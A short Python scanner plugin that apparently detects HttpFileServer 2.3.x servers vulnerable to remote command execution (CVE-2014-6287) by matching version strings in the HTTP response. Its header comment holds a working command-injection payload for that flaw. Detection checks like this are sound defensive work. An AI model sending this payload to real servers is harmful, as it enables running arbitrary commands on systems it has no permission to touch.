#!/usr/bin/env python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Version: 2.3.x
# CVE : CVE-2014-6287
# EXP : /?search=%00{.exec|calc.}
import urlparse
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = "/?search=hfs"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and "HFS 2.3" in head and "HttpFileServer v2.3" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://www.example.com/')[1])